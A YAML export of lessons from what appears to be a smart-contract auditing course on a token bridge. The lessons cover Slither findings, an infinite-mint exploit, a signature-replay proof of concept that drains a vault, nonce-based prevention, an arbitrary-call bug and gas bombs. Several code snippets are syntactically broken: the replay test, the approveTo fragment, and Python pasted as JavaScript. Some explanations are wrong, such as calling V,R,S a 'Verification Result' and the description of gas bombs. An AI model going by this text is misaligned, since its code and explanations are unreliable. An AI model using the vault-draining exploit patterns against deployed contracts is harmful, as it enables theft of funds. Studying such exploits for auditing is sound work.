        description: "We detail a proof of code for our identified 'arbitrary from' vulnerability."
      -
        id: 20c4bf89-7c19-49f0-a902-420d06188892
        type: new_lesson
        enabled: true
        title: 'Recon Continued (again)'
        slug: recon-continued-again
        duration: 5
        video_url: 6fX7WXRImMzawIVLKIMwGITCyB8eGpZbXlKy01kAWD5I
        raw_markdown_url: /routes/security/7-bridges/21-recon-continued-again/+page.md
        markdown_content: |-
          ---
          title: Recon Continued Again
          ---



          ---

          # Auditing For Ethereum Vulnerabilities: A Deep Dive

          Ever felt like unraveling the intricacies of handling vulnerabilities in Ethereum applications? You're at the right place. Let's go ahead and walk you through the eccentric realm of vulnerability handling using the Slither code analysis tool.

          Before proceeding, bear in mind that this journey does not aim to demoralize the workings of Ethereum applications, but to encourage developers to safeguard and optimize them further.

          ## Unchecked Return Value: Be diligent or Perilous?

          Moving along, our next houseguest is the 'approve' function. This method seems to be ignoring its return value. This irregularity, if unchecked, could lead to catastrophic consequences.

          On investigating, Slither reports that while calling the SafeMath `add` method, we aren't storing the resultant sum, rendering the operation meaningless.

          While this isn't an issue all the time, for a more secure and tight-knit application, we should validate the return values just to make our code robust.

          However, going by the information at our disposal, it's not a huge dealbreaker. Next time, Slither, next time.

          ## Zero Check Madness

          Slither is back at it again, pointing out the absence of 'zero check'. Fortunately, we had the foresight to check out the README, which states this clearly: they've deliberately omitted 'zero checks' for input validation to preserve some gas. Nice try Slither, but we're covered.

          ## Navigating The Detectors: Reading Between The Lines

          Here's a fun part: handling reentrancy. This essentially implies an external call not followed by a computation, rather it makes an immediate deposit. Let's take a closer look.

          We found that the L1 BossBridge deposit function does decide to deposit tokens without performing a computation, ergo, no effect. With our code set to accept only our L1 token, one without any attached callback functionality, this poses no significant security threat.

          Despite this, we nonetheless note it as being preferable to follow CEI (Check-Effects-Interactions).

          ## The Unerring Eye Of Slither: Red Flags Galore

          Slither, understandably, doesn't like assembly instructions and different versions of Solidity being used. All these are valid concerns and necessitate modifications of their own.

          The 'deposit limit' being mutable is a red flag and it should generally be set as a constant.

          ```js
          //@Audit Info: Deposit Limit Should Be Constant
          ```

          This is one of the real and impactful bugs pointed out by our trusty friend, Slither. While it has led us on a merry chase with some informational stuff and a myriad of future functions, it did deliver in the end, which makes for a fantastic learning experience!

          ## The Future: A Call To Invariance Testing

          Take a step back, and soak in everything that's happened. Before we ride off into the sunset, we'd like to urge you to take the future of protecting codebases very seriously, and commit yourself to write stateful fuzzing and invariance test suites.

          "Pause the video right now, try to write down some invariants. Understand what are the invariants, and then write your own fuzzing test suite."

          Slither and bossbridge have given us some food for thought and armed us with tools to go fearlessly into the world of Ethereum applications. However, always remember: there's always room to explore, learn, and improve.

          Happy coding, my friends! Remember, the codebase is not a minefield if you know where the mines are!
        description: 'Static analysis using Slither identifies potential vulnerabilities, Patrick issues a warning for false positives.'
      -
        id: 491bf2d2-a33f-42fa-b32b-0e20457c4d4a
        type: new_lesson
        enabled: true
        title: 'Exploit: Infinite Mint'
        slug: vault
        duration: 4
        video_url: g6QF8ql51Gymgf84dIG9bsuRqA6o0082SyAvUogwKbT00
        raw_markdown_url: /routes/security/7-bridges/22-vault/+page.md
        markdown_content: |-
          ---
          title: Exploit - Vault can infinite mint unbacked tokens
          ---



          ---

          # A Deeper Dive into the MEV Attack and Uncovering a Major Security Flaw

          Exciting revelations generally come with a bit of craziness, and today, we bring to you one such incident‚Äîan astonishing vulnerability. At first glance, it appears captivatingly cool, yet incredibly daunting. We reveal a flaw that allows any user to steal funds after the bridge receives approval from someone. This scenario might lead to MEV (Miner Extractable Value) attacks. Intriguing, right? Let's unravel this mystery together.

          ## Uncovering a Significant Security Threat

          ![](https://cdn.videotap.com/yngYAVIajAxqq6gSChMU-18.png)

          The perplexing part is when the vault, intending to authenticate the bridge, essentially leads to a chain of apprehensive questions. What happens if the safe haven we call the vault approves the bridge? Does that mean a user can filch funds from the vault? Did we just expose ourselves to another audit? Or is this a 'high'?

          We can't let this issue slide. So, let's explore this further.

          ## What does Vault's Approval to a Bridge Mean?

          ```javascript
          function testCanTransferFromVaultToVault() {...}
          ```

          The vault, as the entity approving the bridge, raises alarming questions. Let's consider a user initiates a transfer from the vault to the attacker. Ambiguously enough, could this process occur for any amount and for any token within the bridge? That would be a disastrous outcome!

          Our next step? Writing a test to verify this vulnerability.

          ## Is There a Limit to Money Minting?

          ![](https://cdn.videotap.com/bnfWcdfv7XuRYwEfv14a-84.png)

          With our test, we are aiming to transfer from the vault back to itself. When we assert ourselves to be the recipient, the tokenized assets stay within the vault‚Äîthis causes an emission of a deposit event from the vault to the recipient on the L2 layer.

          Here's where things become startlingly interesting. If the tokens stay within the vault infinitely, could we mint unlimitedly on the L2 layer? Let's try this out.

          ## Code Implementation

          In the next set of developments, we need to create an attacker.

          ```javascript
          uint256 vaultBalance = 500 ether;
          minter.mint(address(token), address(vault), vaultBalance);
          ```

          Let's assume, for simplification, that our vault already holds some currency. In this example, we let it hold 500 ether. To effectively simulate this situation, we can use Foundry's cheat code which gifts our vault with 500 ethers of a particular token.

          Following this, we need to direct the trigger towards the deposit event function. This function executes when there's self-transference of tokens to the vault.

          ```javascript
          emit deposit(address(token), address(vault), address(attacker), vaultBalance);
          ```

          Understandably, it sounds a bit nonsensical. Why are we sending it back to ourselves? However, the objective here is to transfer it to the attacker.

          ```javascript
          tokenbridge.depositToL2(
            address(token),
            address(vault),
            address(attacker),
            vaultBalance
          );
          ```

          Now comes the shocker moment! We can ostensibly perform this operation indefinitely because we're continually sending back the tokens to the vault. Do we just stumble upon a way to mint infinite tokens on the L2 layer? Let's validate this.

          ...

          Yikes! We indeed did. We've indeed discovered a loophole that allows users to mint tokens on the L2 layer, theoretically, without limitation, irrespective of whether they could withdraw these tokens or not.

          The realization of this potential for creating an unlimited number of tokens flags a significant issue. It's undeniably a vulnerability of high severity. We won't get into a thorough write-up, but the proof of this code's failure is quite evident from this exploration, reminding us of the constant need to stay vigilant in the technology sector.
        description: 'Highlights the "Infinite Mint" vulnerability in Boss Bridge that allows any user to steal funds if the vault approves the bridge.'
      -
        id: 795f5011-08d2-489f-9d32-5f0216c39885
        type: new_lesson
        enabled: true
        title: 'Why are these not the same finding?'
        slug: why-not-the-same
        duration: 2
        video_url: nDcqp1KrhHtFuotKGO8xpAi35p8iA9PCxsiOkd900c01U
        raw_markdown_url: /routes/security/7-bridges/23-why-not-the-same/+page.md
        markdown_content: |-
          ---
          title: OracleUpgradeable.sol (Continued)
          ---



          ---

          # Unraveling the Conundrum: Are They Two Separate Bugs, Or Just One?

          Whenever you're delving deep into bug relief, it often becomes a question whether to report similar issues separately or bundle them as one. Well, this blog post seeks to clarify these foggy waters, drawing on a practical example involving two similar software functions. Let's dive in, shall we?

          ## Dissecting the Problem at Hand

          Our situation consists of two seemingly identical problems arising from similar functions. You might be asking, as did one of our colleagues, _why are we reporting these as two separate issues? Aren't they the same issue?_.

          ![](https://cdn.videotap.com/6gzcQPFB2rgdRBI8JFJa-11.36.png)

          Fair question, right? After all, it's an essential part of troubleshooting to identify the issues accurately, so we can apply correct fixes and prevent future recurrences. Let's start by understanding the root cause of these bugs to see if they are more distinct than they appear.

          ### The Root Cause

          > "In every complex problem lies an opportunity to learn."

          Look closely, and we find that the two bugs have slightly different root causes.

          **Bug 1:** The problem here is that after 'someone else' approves, a user can surreptitiously 'steal' their funds. This issue essentially arises from an 'arbitrary send' from another user, which isn't supposed to happen in a robust, secure system.

          **Bug 2:** We see that while it deals with 'stealing' as well, the issue isn't strictly similar. The problem here essentially arises from the vault always having maximal approvals. This bug, therefore, isn't solely dependent on the thieving user, but also on the software giving unwarranted permissions.

          ![](https://cdn.videotap.com/l0gRdGu8ti9QkBOZPlHZ-36.92.png)

          Yes, you could argue that at their core, these issues do outline a 'similar' root cause. This claim holds some merit after all since both problems involve unauthorized access and fund misappropriation. Still, the dramatic differences in the details could be seen as suggesting two separate bugs.

          ### An Interesting Conundrum

          We stand before an interesting conundrum in software debugging ‚Äî whether to consider identical root causes with different details as a single bug or multiple. Personally, I find these two bugs intriguingly intricate enough to merit separate reports. Of course, as this is not a hard and fast rule, opinions may differ. There's room for a heated debate here, with Technocrat A claiming they're the same issue and Developer B insisting they're two different things.

          ### The Result: Two Bugs or One?

          Putting aside the scholarly debate on debugging philosophy, in practical terms, we have two problems that necessitate separate solutions. Thus, regardless of their identical core, from our perspective, these remain two separate findings.

          ![](https://cdn.videotap.com/PtXNrChg21iZ1dkXkyTz-53.96.png)

          ## And We Are 'Cooking'

          In our world of programming, this is called 'cooking.' We take the raw ingredients (issues) and turn them into tasty dishes (resolved problems).

          Are there any other issues lurking beneath the surface? Possibly. For now, though, I think we're in good shape having identified these two intriguing bugs. We've ironed out a major part of our problem-solving journey, leaving potentially two more crucial functions to dissect.

          So what's the lesson here? Bugs always aren't what they seem. And, just as crucially, sometimes they are exactly what they seem. But the beauty of it all lies in the exploration and discovery.

          Stay tuned in to our coding adventures. Let's see what else we discover along the way. Happy 'cooking'!
        description: 'Patrick discusses how to identify if similar findings are recognized as unique bugs and how to determine distinct vulnerabilities by considering the root cause.'
      -
        id: c5c88396-a8a2-49a8-922b-845543a3b3aa
        type: new_lesson
        enabled: true
        title: 'Recon Continued Again (again)'
        slug: recon-again-again
        duration: 6
        video_url: 02uyrS2neealp6yHRU3JEBxzwSEyxbPgSnZcFHcJqraI
        raw_markdown_url: /routes/security/7-bridges/24-recon-again-again/+page.md
        markdown_content: |-
          ---
          title: Recon (Continued) Again
          ---



          ---

          # Understanding Token Withdrawal From L2 to L1 in Blockchain

          In this post, we'll be deep diving into a crucial function that is responsible for the withdrawal of tokens from L2 to L1. Along the way, we will demystify some blockchain terminologies like VR and S, and explore how security mechanisms prevent replay attacks.

          In this process, we are going to look into two essential parameters: VR and S, and the address of the user, and then explore the 'send to l one V, R and S' function. We will also dig a little into gasless transactions and encoding some data in various functions.

          ## Signature: A Safety Net Against Replay Attacks

          The function we will be examining requires what we refer to as "signature" - an essential feature to prevent sketchy replay attacks.

          ```js
            function withdrawL2(address _l2Token,address _from,address _to,uint256 _amount,uint32 _l1Gas,bytes calldata _data) external returns (bytes memory){}
          ```

          Here, `_from` works as the address of the user receiving tokens on L1. `_amount` determines the tokens to withdraw, and `data` emits the signature coming from the signed data. This gives us VR and S.

          ## Embarking on The Token Withdrawal Journey

          ![](https://cdn.videotap.com/UsY4cL26EFFcQNaxeMa5-118.72.png)

          Now, let's walk through the process of withdrawing tokens from L2 to L1. In the function, it's apparent that anyone can initiate a token withdrawal to L1. Let's analyze the step that happens when we call 'send to l1 V, R and S'.

          ## Signature Verification and Gasless Transactions

          Tokens are withdrawn from L2 to L1 upon calling 'send to l1 V, R and S.' ABI encoding (a part of signing in Ethereum) is key to our discussion here. It signs the essential message we will verify for authenticity.

          > "Allowing people to call transactions by signature introduces the beneficial feature of gasless transactions, called relays."

          Withdrawing tokens via signatures brings many benefits, despite it seeming a bit unusual. For instance, it enables gasless transactions, which can help users save on network gas fees.

          ## Unravelling the sendToL1 'V, R and S' and ECDSA Recover Function

          Upon calling `sendToL1`, we come across V, R and S encoded as bytes in the memory message. Let's now delve into the 'ECDSA Recover' to verify the signer.

          ```js
          function recover(bytes32 hash, bytes memory signature)
          ```

          Invoking 'recover' in the `sendToL1` function gets the function `Try Recover`, which eventually reaches out to the ECDSA recover at the lower part.

          It's quite confusing, but stay with me!

          Behind the scene, the private key and the signed message combine to become the input parameters constituting V, R and S. The chain is verifying the message off-chain.

          ![](https://cdn.videotap.com/VndGsyKD2Q9sT0kYNAIq-217.66.png)

          The highlighted block of code converts the signed message into a designated format. The `ecrecover` and `hashutils twoethereum` play a significant role in this. Afterward, it calls `ECDSA Recover` to verify the signer.

          Let the code tickle your curiosity and compel you to inspect it further. So, let's proceed!

          ## Ensuring Only Authorized 'Signer' Can Operate

          The above block of code facilitates how the V, R and S signer can withdraw tokens from L2 to L1. This flow makes sense ‚Äìonly an authorized signer should be able to unlock tokens on L2. Any unauthorized access will cause a total system revert.

          The codes continue to decode the message after verifying the 'signer.'

          ```js
            (address target, uint256 value, bytes memory data) = abi.decode(_message, (address, uint256, bytes));
          ```

          The system finally performs a low-level call, unlocking the token over here. It uses the 'signer' placed in the target call feature with the determined data. If this is not successful, it reverts again.

          Here ends our thorough examination of withdrawing tokens from L2 to L1. It can be complicated but don't sweat it; every blockchain pro started from somewhere! Happy coding!
        description: 'Dive into the withdraw function and the potential protections versus replay attacks.'
      -
        id: f751fc12-ba83-440b-89aa-c9f884a04542
        type: new_lesson
        enabled: true
        title: 'Exploit: Signature Replay'
        slug: exploit-replay
        duration: 1
        video_url: kGbJsEKbl8Jg0142FtHkcPOKZJ3KOU2J1al7401o1dVD00
        raw_markdown_url: /routes/security/7-bridges/25-exploit-replay/+page.md
        markdown_content: |-
          ---
          title: Exploit - Signature Replay Introduction
          ---



          ---

          # Deep Dive Into Blockchain Security: Unraveling possible threats.

          One of the most critical aspects of blockchain technologies is the security of transactions. From initial transaction construction to the validation and final verification, every step needs to be sealed tight against possible leaks and malicious hacks.

          ![](https://cdn.videotap.com/U6sIP6ZAYI2aZNSWp4tF-3.87.png)

          There is an exciting operation happening here, particularly the part where cryptography plays an integral role in securing these transactions. Yet, can we say with utter certainty that this operation is foolproof? Let us explore this in detail.

          ## Role of Cryptography in Blockchain Security

          Primarily, a piece of cryptographic math, or simply cryptomath, is used to generate a digital signer, or simply, Signer. The very next step is to verify that this Signer in question is legitimate. Primarily, this is designed to prevent unauthorized users or hackers from tampering with the information or modifying it to their advantage.

          But the crucial question is, is there a way for some other random user, possibly with malicious intent, to bypass this system and pose as the Signer?

          Theoretically, let‚Äôs analyze this process in detail.

          ### Examining the Signature Placement

          Think about it like this:

          When the Verification Result (VR) and Signature (S) are placed on the blockchain, they form what is essentially a 'signature.' Once the signature is up on-chain, it becomes universally visible. It's comparable to a signed message that's been broadcasted across the network.

          As a user, you won‚Äôt have access to the private key, but the signed message is right there, quite visible. Still, unless you misuse this, everything is as safe as it should be, correct?

          Here's where things start to become interesting.

          Consider this scenario:

          _What if another user decided to send the exact same signed message?_

          It does sound a bit nerve-wracking, doesn‚Äôt it?

          ```js
          if (message.signature === duplicated_message.signature) {
            console.log("Threat detected");
          }
          ```

          Upon reflection, this certain aspect reveals the possibility of a potential security breach. An unauthorized user might mimic a legitimate sender by duplicating the signature, consequently causing a remarkably serious issue.

          > **Blockquote**: "He who knows only his side of the case, knows little." - John Stuart Mill

          ## The Vulnerability Verdict: Is Blockchain Security Assured?

          So, putting it bluntly, could this be the Achilles Heel in our otherwise 'unbreakable' blockchain security? It indeed could be! As developers and engineers passionate about blockchain technology, it's critical that we assess and address every overlooked vulnerability. In this context, considering the possibility of a duplicate signed message on-chain could point us to areas of our system that require more robust fortification.

          Engaging in such analytical exploration is not just about identifying problems. It's also about fostering a culture of improvement and evolution in the world of blockchain technology. With every obstacle we overcome, we not only make our systems safer; we also contribute to the overall growth and credibility of blockchain technology.

          ![](https://cdn.videotap.com/0t4sBJFtbzZLfqeahsX4-54.13.png)

          In conclusion, blockchain security depends heavily on its cryptographic standards. Even though the possibility of a breach might be low, as technology progresses and attackers become more sophisticated, possibilities might become realities. Therefore, remaining informed, prepared, and proactive is the key to staying one step ahead!
        description: 'Learn about cryptographic verification and blockchain signatures as well as preserving the integrity of signed messages.'
      -
        id: 2068428c-986b-408b-a3d9-afd659319258
        type: new_lesson
        enabled: true
        title: 'Signature Replay: Minimized'
        slug: replay-minimizd
        duration: 2
        video_url: HWlULSjWO2Be401V8KlE02sJ2XGUnvQYXULzRyVOav5nI
        raw_markdown_url: /routes/security/7-bridges/26-replay-minimizd/+page.md
        markdown_content: |-
          ---
          title: Exploit - Signature Replay Minimized
          ---



          ---

          # Understanding Signature Replay Attacks: A Critical Look at Contemporary Blockchain Exploits

          Let's delve headfirst into one of the most recurrent threats on the blockchain- signature replay attacks. These attacks are unpleasantly commonplace and understanding them thoroughly is paramount in creating a secure, decentralized network. Now, signature replay attacks might sound menacingly complicated at first thought, but trust me, as we go through the concepts and how it actually happens, it will become significantly less intimidating!

          In my quest to provide a hands-on understanding of these signature replay attacks, I have created a fantastic open-source repo, `sc-exploits-minimized`, that will allow you to fiddle with blockchain signatures and remix them as you'd like. It's a great playground to get those hands dirty, but for the sake of understanding, I find it easier to pull up the **SC Exploits Minimized Test Case Unit**, specifically `signatureReplaytest.sol` file, and witness how signature replay attacks unfold in reality.

          ## The Anatomy of Signature Replay Attacks

          Here's a breakdown of how the signature replay attack operates in this particular test case. The process involves a victim and an attacker, each playing their parts in a scenario that very much reflects the real-world possibility of such attacks.

          Here's an overview of the function: `testSignatureReplay`.

          - Firstly, a victim deposits some funds into the protocol. It's like putting your money in a virtual safe.
          - Once deposited, they engage in all sorts of encoding activities.
          - The victim then signs the digest or the formatted message to get the V, R and S values- These are generated as part of the ECDSA (Elliptic Curve Digital Signature Algorithm) sign message function.
          - After signing the digest, they proceed to call `WithdrawBySIG` to withdraw the required amount.

          This process, even though seems harmless, opens up a large vulnerability for potential attackers to exploit.

          ```js
          function testSignatureReplay() public {
              /* victim deposits into the protocol */
              ...
              /* encoding and digest signing to get V, R and S */
              ...
              /* victim calls 'WithdrawbySIG' */
              ...
              }
          ```

          ![](https://cdn.videotap.com/FIMkVw05x2zEDqU0YEm8-42.24.png)

          ## Unpacking The Flaw

          So where does it go wrong? Well, it's the post-withdrawal phase that introduces the opportunity for an attacker to wreak havoc. This is how it goes:

          - Upon seeing the V, R and S on-chain, the attacker realizes that there's nothing preventing it from being reused. In essentially, having this crucial V, R and S information plastered on the chain without protections is just begging an attacker to play around with it.
          - The attacker then proceeds to continuously call `WithdrawbySIG` until all the money is missing, effectively draining the victim's funds.

          Keep in mind that in this example, the attacker does not steal any money. Their primary goal is to kick the victim out of the protocol permanently, rendering any further transactions or involvement in the system impossible for the victim.

          It‚Äôs essential to note that the lack of mechanism in place to prevent the V, R and S from being reused is the critical flaw in this script.

          > **_"To tackle signature replay attacks effectively, you need to understand that the crux of the problem is the reuse of VR and S with no protective measures."_**

          ## The Bigger Picture

          Signature replay attacks expose significant vulnerabilities in the blockchain system, making them a fertile ground for attackers to exploit. By understanding the nuts and bolts of these attacks, you can develop robust systems and strategies to circumvent these risks, contributing to a secure and more decentralized financial network.

          As we dive deeper into this brave, new, decentralized world, remember that understanding is the first step towards prevention. We aren't just tech enthusiasts; we're defenders of the future of finance! Be vigilant and keep learning.
        description: 'Create a Signature Replay Attack using sc-exploits-minimized in Remix!'
      -
        id: 8ffdf897-73ba-4c5c-96c8-aa49a0c6f3ea
        type: new_lesson
        enabled: true
        title: 'Signature Replay PoC'
        slug: signature-replay-protection
        duration: 7
        video_url: uwDa5bKISoR7P02zdfarzlffYREMj931TsFSkF1H028QA
        raw_markdown_url: /routes/security/7-bridges/27-signature-replay-protection/+page.md
        markdown_content: |-
          ---
          title: Signature Replay Protection
          ---



          ---

          # Vulnerabilities Found in the V, R and S: A Deep Dive into Replay Protection

          Welcome to another deep dive into smart contract vulnerabilities. We're dissecting V, R and S -- a signature often found in blockchain technology.

          ![](https://cdn.videotap.com/fepx5pOEwGHrxsJGEs9y-17.14.png)

          During this long and fascinating journey, we'll be breaking down each step to understand the vulnerabilities at a granular level. In particular, we'll be examining whether this signature benefits from replay protection. Spoiler alert: it doesn't. Let's delve in!

          ## Crafting a Proof of Concept Code

          Our journey starts by raising a sobering question: Can this signature be deployed more than once? To answer this, we put together a proof-of-concept code that shows how this could potentially occur, leading to vulnerabilities.

          ```javascript
          function testSignatureReplay() public {
              uint vaultInitialBalance = 1000e18;
              uint attackerInitialBalance = 100e18;
              address attacker = makeAdr(attacker);
              deal(address tokenAddress, vault, vaultInitialBalance);
              deal(address tokenAddress, attacker, attackerInitialBalance);
              uint v, bytes32 r, bytes32 s = vm.sign(private key ...);
              bytesmemory message = abi.encode(address token, 0, encodeCall(IERC20.transferFrom(address vault, attacker, attackerInitialBalance) ));//in a loop until vault balance is zero
              tokenbridge.withdrawTokensToL1(attacker, attackerInitialBalance, V, R, S);
              assertEqual(token.balanceOf(address attacker), attackerInitialBalance + vaultInitialBalance);
              assertEqual(token.balanceOf(address. Vault), 0);
          }
          ```

          Let's break this down.

          The function `testSignatureReplay()` assumes that a vault already holds some tokens. The initial balance of the vault and an attacker are given. The function then carries forth several deals. An attacker is set up who deposits tokens to a layer 2 (L2) chain.

          ## Signature and Transfer

          ```javascript
           uint v, bytes32 r, bytes32 s = vm.sign(private key ...);
          ```

          This part of our code does a bit of magic by signing the data with a private key. Thanks to Foundry, we can utilise a cheat code `VM.sign` to sign with the operator key, and then hash the actual data.

          The next step is to formulate our `message`.

          ```javascript
          bytes memory message = abi.encode(address token, 0, encodeCall(IERC20.transferFrom(address vault, attacker, attackerInitialBalance) ));
          ```

          Here, we're essentially encoding a message instructing a transfer from the vault to the attacker. The signed message containing the V, R, and S values are usually what prompts MetaMask to ask for confirmation.

          The signed message indicates a legitimate deposit of tokens from Layer 1 (L1) to L2. The operator, seeing this as valid, then submits V,R,and S on-chain.

          This is the point where the replay attack becomes feasible. As soon as the operator's signature is placed on-chain, an attacker can simply keep invoking `withdrawTokensToL1` using that very same signature, draining balance from the vault until it's completely empty.

          ## The Aftermath

          And how do we know it works? After running this function, we have successfully drained the vault entirely whilst increasing the attacker's balance accordingly:

          ```javascript
          assertEqual(token.balanceOf(address attacker), attackerInitialBalance + vaultInitialBalance);
          assertEqual(token.balanceOf(address. Vault), 0);
          ```

          In short, we've just carried out a successful attack!

          ## Wrapping up

          Looking at the given scenario, it becomes evident how signatures without replay protection, such as the one in our example, can pose significant security risks. Despite its relatively small codebase, such attacks can have substantial consequences. Always remember, when coding smart contracts, always ensure that your code includes mechanisms to prevent a replay attack.

          Audit data and additional findings related to the topic can be found in the corresponding Git Repo. Happy coding and be safe!

          > "Security in blockchain technology involves a constant combat against potential threats and vulnerabilities."
        description: 'We walk through a PoC for signature replay attacks with Patrick.'
      -
        id: eb2034da-2814-4886-8a0d-22708017cf33
        type: new_lesson
        enabled: true
        title: 'Signature Replay: Prevention'
        slug: sig-replay-prevention
        duration: 1
        video_url: ifhNh02kZjmFSAHbVAKD02tcb4HwKmcejLxfUTWtmEs8s
        raw_markdown_url: /routes/security/7-bridges/28-sig-replay-prevention/+page.md
        markdown_content: |-
          ---
          title: Sig Replay Prevention
          ---



          ---

          # The Art of Preventing Signature Replay Attacks

          Hello there! In today's digital world, the protection of your data and privacy are of the utmost importance, especially when it comes to the vast field of cryptography. One common area where issues might arise involves signature replay attacks. Before we delve into the prevention methods, it's important to understand what these attacks are.

          ![](https://cdn.videotap.com/5mzAbV6qyV86T7x1bv34-2.67.png)

          A signature replay attack involves an attacker illicitly using a data transmission or digital signature multiple times, potentially leading to fraudulent actions. In order to put a stop to this, the most prevalent method is to utilize something called 'nonces' or include a deadline. Curious to know more? Let's dive in.

          ## Nonces ‚Äì A Key Combatant Against Replay Attacks

          A ‚Äònonce,‚Äô or ‚Äònumber used once,‚Äô is an arbitrary number that can be used precisely one time in a cryptographic communication. It is commonly a random or pseudo-random number, serving as one of the strongest safeguards against signature replay attacks. It's this concept that plays a pivotal role in preventing these types of attacks.

          The mechanism is straightforward: We put some specific parameters into the signature. When the signature gets hashed, or signed, it can only be used one time.

          ## Ensuring The Authentic Signature Sender

          Of course, the nonce method is just the start. To ensure the integrity of our message, it might also be necessary to verify that the initial signature was obtained from the actual sender or originator.

          Consider this: The first time a message is signed, it's crucial that the signature be from the _true_ signer. It sounds obvious, right, but how can we make sure of this?

          Again, our solution lies in the way we handle and hash our signatures, in something called a digital signature scheme. A digital signature scheme ensures that each signature made on the same message is unique by varying a part of the cryptographic elements used in the signing process. It might sound a bit complex, but let's break it down with a simple code example:

          ```js
          function sign(message, key, private_param);
          nonce = random.getrandbits(128) // create a 128-bit random nonce
          hashed_private_param = hashlib.sha256(private_param).hexdigest()
          hashlib.sha256(key + nonce + message + hashed_private_param).hexdigest() // hash the key, nonce, message, and hashed private_param, and return as a hex string
          ```

          In this code, we‚Äôve added one more parameter in the signing process, a private parameter that is unique for each sender. This element is hashed and added to our overall signature.

          ## Conclusion

          > ‚ÄúAlways make sure your messages and signatures come with a one-time ticket ‚Äì The nonce."

          The use of nonces, or one-time use data, in these signatures is a crucial element in ensuring that your digital signatures are protected from being misused. If utilized correctly, they can serve as a solid wall protecting you from the potential signature replay attacks. Generally, it all boils down to integrating this concept into the design and implementation of cryptographic systems.

          As with any other part of cybersecurity, staying one step ahead of possible attackers is the name of the game, so it's essential to keep learning and adapting. Stay tuned for more updates and insights into the realm of cybersecurity!
        description: 'Learn about nonce-based protection against replay attacks in transaction handling.'
      -
        id: 3a1b25ed-a5e3-4c7b-a2c4-2fe61c02505b
        type: new_lesson
        enabled: true
        title: 'Exploit: Low level call to itself'
        slug: low-level-exploit
        duration: 2
        video_url: qd5NSTSSWw302bgds6b1LKNcftp6u2EHj025k802fxlvSM
        raw_markdown_url: /routes/security/7-bridges/29-low-level-exploit/+page.md
        markdown_content: |-
          ---
          title: Low-Level Exploit
          ---



          ---

          # Uncovering Hidden Bugs in Code Base: A Developer's Challenge

          Today, let's delve into a particularly intriguing part of the code base that's rife with at least two major bugs. I encourage you to dig deep, find these bugs, and thoughtfully attempt to write them out. If you don't grasp the explanation right away, don't be discouraged - just refer to the GitHub repository linked to this section for a more comprehensive understanding of these bugs.

          Even if the bugs are a bit cryptic in nature, Slither ‚Äì our static analysis tool ‚Äì has lobbed a figurative tip-off in our direction, indicating that things aren't all peaches and cream. So, let's proceed to unravel these bugs, shall we?

          ### When Things Go Wrong

          The first bug we have on our hands isn't as straightforward as it might initially seem. This bug is associated with a code snippet that Slither flagged as suspicious or possibly detrimental.

          ```js
          sendToL1(Arbitrary_message);
          ```

          Is Slither's panic alarm warranted in this situation? Unfortunately, the answer, in this case, is a resounding **yes**. The bug is not just bad, it's downright dreadful.

          #### Arbitrariness and the Hidden Flaws

          What's the core problem, you ask? It all pertains to the way the `sendToL1` function passes arbitrary messages. In simple terms, the function is just accepting any given inputs without any verification system, which could be a potential security risk.

          To grasp this problem, we need to understand the `vault` and its `approveTo` function. This particular function can only be called upon by the `bridge`.

          ```js
          function approveTo(Bridge, Token) // Can only be called by the bridge
          if (caller != Bridge){
              throwToken.totalSupply -= caller.balancecaller.balance = 0
              }
          ```

          Now, imagine if someone triggers this `approveTo` function, passing malicious data asking the bridge to approve tokens for a hacker. Then, in record time, the hacker manages to drain all the tokens in the vault. Sounds like a dreadful fate, doesn't it? In the world of coding, this is just as destructive and catastrophic.

          > Quote: "Bugs are like viruses - they can cause a minor irk or lead to a total system downfall."

          ### Slither's Warning: A Red Flag

          Aside from dire warnings about the first bug, Slither also gives us a prompt about another flaw in the system.

          Identifying these issues is crucial for ensuring that our code remains secure, efficient, and, above all, bug-free. So, let's not sideline Slither‚Äôs red flags, and give them as much attention, if not more, as we would to the other parts of our code base.

          ## Conclusion

          Bugs in your code base can range from harmless to a total catastrophe. Understanding them, and more importantly, identifying them before they wreak havoc, is a crucial part of any developer's journey. SO tune in next time when we delve into more bugs and how to debug them efficiently.

          Stay curious and keep coding!

          - Note: In case of any queries or difficulties in understanding the bugs, kindly refer to the associated GitHub repo for further explanation, or feel free to leave your questions in the comment section below.
        description: 'Patrick focuses on identifying and resolving two significant security issues within Boss Bridge.'
      -
        id: 79c17e62-5cdf-452a-b733-c84207283d0e
        type: new_lesson
        enabled: true
        title: 'Exploit: Gas Bomb'
        slug: gas-bomb
        duration: 1
        video_url: Gtt6PwqEuAVgUm1tNatgGY92DOHQPq3hCREGKuTK2gY
        raw_markdown_url: /routes/security/7-bridges/30-gas-bomb/+page.md
        markdown_content: |-
          ---
          title: Exploit: Gas Bomb
          ---



          ---

          # Demystifying Gas Bomb and Other Blockchain Vulnerabilities

          The world of blockchain is buzzing with fascinating features and vulnerabilities. One such intriguing element I'd like to shed some light on is the phenomena known as the gas bomb. This seemingly complex occurrence has sparked much debate, and I hope this post will provide you with some clarity on what exactly it is, how it works, and the kind of impact it can have.

          ## What is a Gas Bomb Anyway?

          A gas bomb in blockchain terms is a low-level call where Solidity, the smart contract programming language, and the Ethereum Virtual Machine (EVM), the runtime environment, struggle to estimate the amount of computational effort (gas) needed to execute certain transactions.

          ![](https://cdn.videotap.com/ffmuYOJbZ3iqYxllhGBD-5.94.png)

          > **Note**: Gas refers to the computational effort required to execute an operation in the Ethereum network.

          A malicious user can exploit this to trick the network into allocating absurd amounts of gas, and thereby charging other network participants excessively to execute a function.

          ## Understanding the Implications

          What's interesting about gas bombs is how they're used in the network. For instance, while some users might employ this method to gain profits, others seem to have darker motivations. Often, these users utilise this exploit for seemingly no tangible benefits. Their motivations? To disrupt the system and cause chaos.

          > "Some people just want to watch the world burn."

          It's a poignant phrase that well encapsulates the mentality of these malicious actors. They create chaos without expecting any monetary gain in return. Their goal isn‚Äôt to profit, but simply to disrupt the system - no rhyme, no reason, just pure anarchy.

          ![](https://cdn.videotap.com/l0jIWaD8hhNflUJypCfy-22.29.png)

          ## Ready To Dive Deep?

          If by now, you're wrapped in a whirlwind of questions, I'm glad! Because what's learning without a little bit of challenge? But, if you're wondering what the hoo-ha I am talking about, now would be a good time to pause and take a breather.

          I encourage you to delve in, try to construct the proof of code for the vulnerabilities we discussed, and even to try your hand at crafting your gas bombs.

          To get started, consider:

          1. Studying the structure of a low-level call in Solidity and the EVM,
          2. Understanding the significance of gas in the Ethereum network,
          3. Exploring how it's possible for the network to be fooled into allocating excess gas,
          4. Unveiling the motivations of malicious actors, and
          5. Learning how to protect yourself against such exploits.

